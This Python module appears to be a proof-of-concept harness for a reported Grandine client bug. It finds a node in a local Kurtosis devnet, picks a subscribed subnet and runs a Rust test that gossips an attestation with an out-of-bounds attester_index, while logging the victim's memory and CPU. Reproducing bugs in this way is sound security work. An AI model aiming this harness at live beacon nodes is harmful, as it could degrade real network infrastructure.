"""Grandine CHK-QW-02 — SingleAttestation OOB attester_index live repro.

This is the Python side of the E2E repro for CHK-QW-02 (the only
CONFIRMED_VULNERABILITY from the gasper track):

1. discover the grandine CL container in a Kurtosis enclave,
2. resolve its externally reachable libp2p multiaddr,
3. extract the devnet chain config needed for a matching fork digest, and
4. run the Rust attack test that publishes a SingleAttestation with an
   out-of-band attester_index on the beacon_attestation_{subnet_id} topic.

The Rust test is kept in ``harness/probes/grandine_singleattestation_attack.rs``
and is copied into ``grandine/eth2_libp2p/tests/`` at run time.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import tempfile
import urllib.request
from dataclasses import dataclass
from datetime import UTC, datetime
from pathlib import Path

from ..devnet.docker import sample_container
from ..observer import ResourceSample, reduce_samples

# Reuse the target discovery + config extraction from the block-flood probe.
from .grandine_libp2p_attack import (
    GrandineProbeUnavailable,
    GrandineTarget,
    _attack_env,
    _container,
    _copy_first_existing,
    _extract_config,
    _find_libclang_path,
    _host_port,
    _json,
    _peer_id,
    _run,
    _sample_once,
    _scrape_beacon_block_metrics,
    _metric_delta,
    _write_samples_csv,
)


def _cargo_attack_cmd() -> list[str]:
    return [
        "cargo", "test", "-p", "eth2_libp2p", "--features", "blst",
        "--test", "eth2_libp2p_tests", "publish_oob_singleattestation",
        "--", "--ignored", "--nocapture",
    ]


def ensure_rust_test_installed(grandine_dir: Path) -> Path:
    """Copy the SingleAttestation Rust test into grandine's test tree.

    Idempotent: overwrites if the source has changed. Registers the module
    in ``main.rs`` and ensures ``common.rs`` has the needed helpers (delegates
    to the block-flood probe's helper for the common.rs patches).
    """
    from .grandine_libp2p_attack import ensure_rust_test_installed as ensure_block_test

    src = Path(__file__).with_suffix("").parent / "grandine_singleattestation_attack.rs"
    dst = grandine_dir / "eth2_libp2p" / "tests" / "grandine_singleattestation_attack.rs"
    main = grandine_dir / "eth2_libp2p" / "tests" / "main.rs"

    if not src.exists():
        raise GrandineProbeUnavailable(f"missing Rust attack source: {src}")
    if not dst.exists() or dst.read_text(encoding="utf-8") != src.read_text(encoding="utf-8"):
        shutil.copyfile(src, dst)

    # Ensure the common.rs helper from the block-flood probe is also patched
    # (build_attacker_instance etc.) — it's shared infrastructure.
    common = grandine_dir / "eth2_libp2p" / "tests" / "common.rs"
    # Call the block probe's installer to ensure common.rs has the helpers.
    ensure_block_test(grandine_dir)

    text = main.read_text(encoding="utf-8")
    if "mod grandine_singleattestation_attack;" not in text:
        main.write_text(text.rstrip() + "\nmod grandine_singleattestation_attack;\n", encoding="utf-8")
    return dst


def _detect_committees_per_slot(beacon_api: str) -> int:
    """Detect committees_per_slot from the Beacon API.

    Queries the head state's committees for the current epoch and counts
    unique committee indices in a single slot. Falls back to 1 (devnet) on
    error.
    """
    import json
    import urllib.request

    try:
        head = json.loads(
            urllib.request.urlopen(
                beacon_api.rstrip("/") + "/eth/v1/beacon/headers/head", timeout=10
            ).read()
        )
        slot = int(head["data"]["header"]["message"]["slot"])
        epoch = slot // 32
        data = json.loads(
            urllib.request.urlopen(
                f"{beacon_api.rstrip('/')}/eth/v1/beacon/states/head/committees?epoch={epoch}",
                timeout=10,
            ).read()
        )
        committees = data["data"]
        first_slot = min(c["slot"] for c in committees)
        return len({c["index"] for c in committees if c["slot"] == first_slot})
    except Exception:
        return 1


def _detect_target_subnet(beacon_api: str, metrics_api: str, committees_per_slot: int) -> int:
    """Detect a grandine-subscribed attestation subnet and a matching slot.

    Reads grandine's gossipsub metrics to find subscribed attestation subnets,
    then finds the nearest future slot that maps to one of them. Returns the
    subnet id. Falls back to 0 on error.
    """
    import re
    import urllib.request

    # Find subscribed subnets from metrics.
    try:
        text = urllib.request.urlopen(
            metrics_api.rstrip("/") + "/metrics", timeout=10
        ).read().decode()
        subscribed: list[int] = []
        for line in text.splitlines():
            if (
                "gossipsub_topic_subscription_status" in line
                and "beacon_attestation" in line
                and line.rstrip().endswith(" 1")
            ):
                m = re.search(r"beacon_attestation_(\d+)", line)
                if m:
                    subscribed.append(int(m.group(1)))
        if not subscribed:
            return 0
    except Exception:
        return 0

    # Find the head slot.
    try:
        head = json.loads(
            urllib.request.urlopen(
                beacon_api.rstrip("/") + "/eth/v1/beacon/headers/head", timeout=10
            ).read()
        )
        head_slot = int(head["data"]["header"]["message"]["slot"])
    except Exception:
        return 0

    # Find the nearest slot (>= head_slot) that maps to a subscribed subnet.
    # subnet = (cps * (slot % 32) + committee_index) % 64
    # With committee_index=0: subnet = slot % 32 (when cps=1)
    ATTESTATION_SUBNET_COUNT = 64
    for offset in range(64):
        candidate_slot = head_slot + offset
        for ci in range(max(1, committees_per_slot)):
            subnet = (committees_per_slot * (candidate_slot % 32) + ci) % ATTESTATION_SUBNET_COUNT
            if subnet in subscribed:
                return subnet
    return subscribed[0]


def run_singleattestation_attack(
    *,
    enclave: str = "repro-grandine",
    grandine_dir: str | Path = "grandine",
    attester_index: int = 0xFFFF_FFFF,
    subnet_id: int = 0,
    warmup: int = 12,
    timeout: int = 600,
    committees_per_slot: int | None = None,
) -> GrandineTarget:
    """Run the SingleAttestation OOB attack against a live grandine devnet.

    Returns the resolved GrandineTarget. Raises GrandineProbeUnavailable on
    failure.
    """
    from .grandine_libp2p_attack import discover_grandine_target

    target = discover_grandine_target(enclave)
    # Auto-detect committees_per_slot from the Beacon API if not provided.
    if committees_per_slot is None:
        committees_per_slot = _detect_committees_per_slot(target.beacon_api)
    # Auto-detect a grandine-subscribed subnet.
    target_subnet = _detect_target_subnet(
        target.beacon_api, target.metrics_api, committees_per_slot
    )
    grandine_path = Path(grandine_dir)
    ensure_rust_test_installed(grandine_path)

    env = {
        **dict(os.environ),
        **_attack_env(
            target,
            count=None,
            slot_offset=0,
            warmup=warmup,
        ),
        "GR_ATTESTER_INDEX": str(attester_index),
        "GR_SUBNET_ID": str(target_subnet),
        "GR_COMMITTEES_PER_SLOT": str(committees_per_slot),
    }
    env.setdefault("LIBCLANG_PATH", _find_libclang_path())

    proc = subprocess.run(
        _cargo_attack_cmd(),
        cwd=grandine_path,
        env=env,
        text=True,
        timeout=timeout,
    )
    if proc.returncode != 0:
        raise GrandineProbeUnavailable(
            f"singleattestation attack failed with exit {proc.returncode}"
        )
    return target


def run_measured_singleattestation_attack(
    *,
    enclave: str = "repro-grandine",
    grandine_dir: str | Path = "grandine",
    attester_index: int = 0xFFFF_FFFF,
    subnet_id: int = 0,
    warmup: int = 12,
    sample_interval: float = 1.0,
    timeout: int = 600,
    out_dir: str | Path | None = None,
    committees_per_slot: int | None = None,
) -> Path:
    """Run the SingleAttestation attack while sampling victim RSS/CPU.

    Returns the directory containing:
      - ``samples.csv``
      - ``metrics.json``
      - ``attack.log``
    """
    from .grandine_libp2p_attack import discover_grandine_target

    target = discover_grandine_target(enclave)
    # Auto-detect committees_per_slot from the Beacon API if not provided.
    if committees_per_slot is None:
        committees_per_slot = _detect_committees_per_slot(target.beacon_api)
    # Auto-detect a grandine-subscribed subnet.
    target_subnet = _detect_target_subnet(
        target.beacon_api, target.metrics_api, committees_per_slot
    )
    grandine_path = Path(grandine_dir)
    ensure_rust_test_installed(grandine_path)

    if out_dir is None:
        stamp = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
        out_dir = Path("reports/grandine/poc/CHK-QW-02/runs") / stamp
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)

    env = {
        **dict(os.environ),
        **_attack_env(
            target,
            count=None,
            slot_offset=0,
            warmup=warmup,
        ),
        "GR_ATTESTER_INDEX": str(attester_index),
        "GR_SUBNET_ID": str(target_subnet),
        "GR_COMMITTEES_PER_SLOT": str(committees_per_slot),
    }
    env.setdefault("LIBCLANG_PATH", _find_libclang_path())

    samples: list[ResourceSample] = []
    start = datetime.now(UTC)
    metrics_before = _scrape_beacon_block_metrics(target.metrics_api)
    log_path = out / "attack.log"
    with log_path.open("w", encoding="utf-8") as log:
        proc = subprocess.Popen(
            _cargo_attack_cmd(),
            cwd=grandine_path,
            env=env,
            stdout=log,
            stderr=subprocess.STDOUT,
            text=True,
        )
        deadline = datetime.now(UTC).timestamp() + timeout
        try:
            while proc.poll() is None:
                now = datetime.now(UTC).timestamp()
                if now > deadline:
                    proc.kill()
                    raise GrandineProbeUnavailable(
                        f"singleattestation attack timed out after {timeout}s"
                    )
                sample = _sample_once(target.container_id)
                sample.t_seconds = (datetime.now(UTC) - start).total_seconds()
                samples.append(sample)
                __import__("time").sleep(sample_interval)
        finally:
            if proc.poll() is None:
                proc.kill()

    # Take a final sample after the Rust test exits/drains.
    final = _sample_once(target.container_id)
    final.t_seconds = (datetime.now(UTC) - start).total_seconds()
    samples.append(final)

    metrics = reduce_samples(samples, reachable=True)
    metrics_after = _scrape_beacon_block_metrics(target.metrics_api)
    data = {
        "started_at": start.isoformat(),
        "enclave": enclave,
        "container_id": target.container_id,
        "beacon_api": target.beacon_api,
        "metrics_api": target.metrics_api,
        "multiaddr": target.multiaddr,
        "attacker_index": attester_index,
        "subnet_id": subnet_id,
        "warmup": warmup,
        "sample_interval": sample_interval,
        "returncode": proc.returncode,
        "metrics": {
            "rss_delta_mb": metrics.rss_delta_mb,
            "peak_rss_mb": metrics.peak_rss_mb,
            "cpu_pct": metrics.cpu_pct,
            "restart_count": metrics.restart_count,
            "reachable": metrics.reachable,
        },
        "beacon_block_metrics_before": metrics_before,
        "beacon_block_metrics_after": metrics_after,
        "beacon_block_metrics_delta": _metric_delta(metrics_before, metrics_after),
    }
    (out / "metrics.json").write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
    _write_samples_csv(out / "samples.csv", samples)
    if proc.returncode != 0:
        raise GrandineProbeUnavailable(
            f"singleattestation attack failed with exit {proc.returncode}; see {log_path}"
        )
    return out


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Run grandine CHK-QW-02 SingleAttestation repro")
    parser.add_argument("--enclave", default="repro-grandine")
    parser.add_argument("--grandine-dir", default="grandine")
    parser.add_argument("--attester-index", type=lambda x: int(x, 0), default=0xFFFF_FFFF)
    parser.add_argument("--subnet-id", type=int, default=0)
    parser.add_argument("--warmup", type=int, default=12)
    parser.add_argument("--timeout", type=int, default=600)
    parser.add_argument("--sample-interval", type=float, default=1.0)
    parser.add_argument("--out-dir")
    parser.add_argument("--no-measure", action="store_true")
    args = parser.parse_args()

    if args.no_measure:
        t = run_singleattestation_attack(
            enclave=args.enclave,
            grandine_dir=args.grandine_dir,
            attester_index=args.attester_index,
            subnet_id=args.subnet_id,
            warmup=args.warmup,
            timeout=args.timeout,
        )
        print(f"grandine={t.multiaddr} beacon_api={t.beacon_api} metrics={t.metrics_api} cfg={t.config_dir}")
    else:
        out = run_measured_singleattestation_attack(
            enclave=args.enclave,
            grandine_dir=args.grandine_dir,
            attester_index=args.attester_index,
            subnet_id=args.subnet_id,
            warmup=args.warmup,
            timeout=args.timeout,
            sample_interval=args.sample_interval,
            out_dir=args.out_dir,
        )
        print(out)